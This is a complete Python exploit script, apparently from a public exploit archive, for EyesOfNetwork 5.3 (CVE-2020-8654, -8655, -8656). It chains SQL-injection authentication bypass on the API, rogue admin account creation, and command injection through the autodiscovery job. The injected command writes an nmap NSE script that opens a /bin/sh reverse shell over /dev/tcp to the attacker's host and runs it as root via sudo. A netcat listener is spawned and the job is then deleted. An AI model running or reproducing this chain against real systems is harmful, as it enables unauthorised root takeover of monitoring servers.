# Exploit Author: Clément Billac
# Vendor Homepage: https://www.eyesofnetwork.com/
# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso
# Version: 5.3
# CVE : CVE-2020-8654, CVE-2020-8655, CVE-2020-8656

#!/bin/env python3
# coding: utf8
#
#
# CVE-2020-8654 - Discovery module to allows to run arbitrary OS commands
#                 We were able to run the &#039;id&#039; command with the following payload in the target field : &#039;;id #&#039;.
#
# CVE-2020-8655 - LPE via nmap NSE script
#                 As the apache user is allowed to run nmap as root, we were able to execute arbitrary commands by providing a specially crafted NSE script.
#                 nmap version 6.40 is used and doesn&#039;t have the -c and -e options.
#
# CVE-2020-8656 - SQLi in API in getApiKey function on &#039;username&#039; field
#                 PoC: /eonapi/getApiKey?username=&#039; union select sleep(3),0,0,0,0,0,0,0 or &#039;
#                 Auth bypass: /eonapi/getApiKey?&username=&#039; union select 1,&#039;admin&#039;,&#039;1c85d47ff80b5ff2a4dd577e8e5f8e9d&#039;,0,0,1,1,8 or &#039;&password=h4knet

# Python imports
import sys, requests, json, os, argparse, socket
from bs4 import BeautifulSoup

# Text colors
txt_yellow = "\033[01;33m"
txt_blue = "\033[01;34m"
txt_red = "\033[01;31m"
txt_green = "\033[01;32m"
txt_bold = "\033[01;01m"
txt_reset = "\033[00m"
txt_info = txt_blue + "[*] " + txt_reset
txt_success = txt_green + "[+] " + txt_reset
txt_warn = txt_yellow + "[!] " + txt_reset
txt_err = txt_red + "[x] " + txt_reset

# Banner
banner = (txt_bold + """
+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
| 02/2020 - Clément Billac \033[01;34mTwitter: @h4knet\033[00m                                   |
|                                                                             |
| Examples:                                                                   |
| eonrce.py -h                                                                |
| eonrce.py http(s)://EyesOfNetwork-URL                                       |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -port 3128                |
| eonrce.py https://eon.thinc.local -ip 10.11.0.182 -user pentest2020         |
+-----------------------------------------------------------------------------+
""" + txt_reset)

# Arguments Parser
parser = argparse.ArgumentParser("eonrce", formatter_class=argparse.RawDescriptionHelpFormatter, usage=banner)
parser.add_argument("URL", metavar="URL", help="URL of the EyesOfNetwork server")
parser.add_argument("-ip", metavar="IP", help="Local IP to receive reverse shell", default=socket.gethostbyname(socket.gethostname()))
parser.add_argument("-port", metavar="Port", type=int, help="Local port to listen", default=443)
parser.add_argument("-user", metavar="Username", type=str, help="Name of the new user to create", default=&#039;h4ker&#039;)
parser.add_argument("-password", metavar="Password", type=str, help="Password of the new user", default=&#039;net_was_here&#039;)
args = parser.parse_args()

# HTTP Requests config
requests.packages.urllib3.disable_warnings()
baseurl = sys.argv[1].strip(&#039;/&#039;)
url = baseurl
useragent = &#039;Mozilla/5.0 (Windows NT 1.0; WOW64; rv:13.37) Gecko/20200104 Firefox/13.37&#039;

# Admin user creation variables
new_user = args.user
new_pass = args.password

# Executed command
# The following payload performs both the LPE and the reverse shell in a single command.
# It creates a NSE script in /tmp/h4k wich execute /bin/sh with reverse shell and then perform the nmap scan on localhost with the created NSE script.
# Readable PoC: ;echo "local os = require \"os\" hostrule=function(host) os.execute(\"/bin/sh -i >& /dev/tcp/192.168.30.112/8081 0>&1\") end action=function() end" > /tmp/h4k;sudo /usr/bin/nmap localhost -p 1337 -script /tmp/h4k #
ip = args.ip
port = str(args.port)
cmd = &#039;%3Becho+%22local+os+%3D+require+%5C%22os%5C%22+hostrule%3Dfunction%28host%29+os.execute%28%5C%22%2Fbin%2Fsh+-i+%3E%26+%2Fdev%2Ftcp%2F&#039; + ip + &#039;%2F&#039; + port + &#039;+0%3E%261%5C%22%29+end+action%3Dfunction%28%29+end%22+%3E+%2Ftmp%2Fh4k%3Bsudo+%2Fusr%2Fbin%2Fnmap+localhost+-p+1337+-script+%2Ftmp%2Fh4k+%23&#039;

# Exploit banner
print (txt_bold,"""+-----------------------------------------------------------------------------+
| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
| 02/2020 - Clément Billac \033[01;34mTwitter: @h4knet\033[00m                                  |
+-----------------------------------------------------------------------------+
""", txt_reset, sep = &#039;&#039;)

# Check if it&#039;s a EyesOfNetwork login page.
r = requests.get(baseurl, verify=False, headers={&#039;user-agent&#039;:useragent})
if r.status_code == 200 and r.text.find(&#039;<title>EyesOfNetwork</title>&#039;) != -1 and r.text.find(&#039;form action="login.php" method="POST">&#039;) != -1:
  print(txt_info, "EyesOfNetwork login page found", sep = &#039;&#039;)
else:
  print(txt_err, &#039;EyesOfNetwork login page not found&#039;, sep = &#039;&#039;)
  quit()

# Check for accessible EON API
url = baseurl + &#039;/eonapi/getApiKey&#039;
r = requests.get(url, verify=False, headers={&#039;user-agent&#039;:useragent})
if r.status_code == 401 and &#039;api_version&#039; in r.json().keys() and &#039;http_code&#039; in r.json().keys():
  print(txt_info, &#039;EyesOfNetwork API page found. API version: &#039;,txt_bold , r.json()[&#039;api_version&#039;], txt_reset, sep = &#039;&#039;)
else:
  print(txt_warn, &#039;EyesOfNetwork API page not found&#039;, sep = &#039;&#039;)
  quit()

# SQL injection with authentication bypass
url = baseurl + &#039;/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet&#039;
r = requests.get(url, verify=False, headers={&#039;user-agent&#039;:useragent})
if r.status_code == 200 and &#039;EONAPI_KEY&#039; in r.json().keys():
  print(txt_success, &#039;Admin user key obtained: &#039;, txt_bold, r.json()[&#039;EONAPI_KEY&#039;], txt_reset, sep = &#039;&#039;)
else:
  print(txt_err, &#039;The host seems patched or unexploitable&#039;, sep = &#039;&#039;)
  print(txt_warn, &#039;Did you specified http instead of https in the URL ?&#039;, sep = &#039;&#039;)
  print(txt_warn, &#039;You can check manually the SQLi with the following payload: &#039;, txt_bold, "/eonapi/getApiKey?username=&#039; union select sleep(3),0,0,0,0,0,0,0 or &#039;", txt_reset, sep = &#039;&#039;)
  quit()

# Adding new administrator
url = sys.argv[1].strip(&#039;/&#039;) + &#039;/eonapi/createEonUser?username=admin&apiKey=&#039; + r.json()[&#039;EONAPI_KEY&#039;]
r = requests.post(url, verify=False, headers={&#039;user-agent&#039;:useragent}, json={"user_name":new_user,"user_group":"admins","user_password":new_pass})
if r.status_code == 200 and &#039;result&#039; in r.json().keys():
  if r.json()[&#039;result&#039;][&#039;code&#039;] == 0 and &#039;SUCCESS&#039; in  r.json()[&#039;result&#039;][&#039;description&#039;]:
    id = r.json()[&#039;result&#039;][&#039;description&#039;].split(&#039;ID = &#039;, 1)[1].split(&#039;]&#039;)[0]
    print(txt_success, &#039;New user &#039;, txt_bold, new_user, txt_reset, &#039; successfully created. ID:&#039;, txt_bold,  id, txt_reset, sep = &#039;&#039;)

  elif r.json()[&#039;result&#039;][&#039;code&#039;] == 1:
    if &#039; already exist.&#039; in  r.json()[&#039;result&#039;][&#039;description&#039;]:
      print(txt_warn, &#039;The user &#039;, txt_bold, new_user, txt_reset, &#039; already exists&#039;, sep = &#039;&#039;)
    else:
      print(txt_err, &#039;An error occured while querying the API. Unexpected description message: &#039;, txt_bold, r.json()[&#039;result&#039;][&#039;description&#039;], txt_reset, sep = &#039;&#039;)
      quit()
  else:
    print(txt_err, &#039;An error occured while querying the API. Unepected result code. Description: &#039;, txt_bold, r.json()[&#039;result&#039;][&#039;description&#039;], txt_reset, sep = &#039;&#039;)
    quit()
else:
  print(txt_err, &#039;An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response&#039;, sep = &#039;&#039;)
  quit()

# Authentication with our new user
url = baseurl + &#039;/login.php&#039;
auth_data = &#039;login=&#039; + new_user + &#039;&mdp=&#039; +new_pass
auth_req = requests.post(url, verify=False, headers={&#039;user-agent&#039;:useragent,&#039;Content-Type&#039;:&#039;application/x-www-form-urlencoded&#039;}, data=auth_data)
if auth_req.status_code == 200 and &#039;Set-Cookie&#039; in auth_req.headers:
  print(txt_success, &#039;Successfully authenticated&#039;, sep = &#039;&#039;)
else:
  print(txt_err, &#039;Error while authenticating. We expect to receive Set-Cookie headers uppon successful authentication&#039;, sep = &#039;&#039;)
  quit()

# Creating Discovery job
url = baseurl + &#039;/lilac/autodiscovery.php&#039;
job_command = &#039;request=autodiscover&job_name=Internal+discovery&job_description=Internal+EON+discovery+procedure.&nmap_binary=%2Fusr%2Fbin%2Fnmap&default_template=&target%5B2%5D=&#039; + cmd
r = requests.post(url, verify=False, headers={&#039;user-agent&#039;:useragent,&#039;Content-Type&#039;:&#039;application/x-www-form-urlencoded&#039;}, cookies=auth_req.cookies, data=job_command)
if r.status_code == 200 and r.text.find(&#039;Starting...&#039;) != -1:
  job_id = str(BeautifulSoup(r.content, "html.parser").find(id="completemsg")).split(&#039;?id=&#039;, 1)[1].split(&#039;&rev&#039;)[0]
  print(txt_success, &#039;Discovery job successfully created with ID: &#039;, txt_bold, job_id, txt_reset, sep = &#039;&#039;)
else:
  print(txt_err, &#039;Error while creating the discovery job&#039;, sep = &#039;&#039;)
  quit()

# Launching listener
print(txt_info, &#039;Spawning netcat listener:&#039;, txt_bold)
nc_command = &#039;/usr/bin/nc -lnvp&#039; + port + &#039; -s &#039; + ip
os.system(nc_command)
print(txt_reset)

# Removing job
url = baseurl + &#039;/lilac/autodiscovery.php?id=&#039; + job_id + &#039;&delete=1&#039;
r = requests.get(url, verify=False, headers={&#039;user-agent&#039;:useragent}, cookies=auth_req.cookies)
if r.status_code == 200 and r.text.find(&#039;Removed Job&#039;) != -1:
  print(txt_info, &#039;Job &#039;, job_id, &#039; removed&#039;, sep = &#039;&#039;)
else:
  print(txt_err, &#039;Error while removing the job&#039;, sep = &#039;&#039;)
  quit()

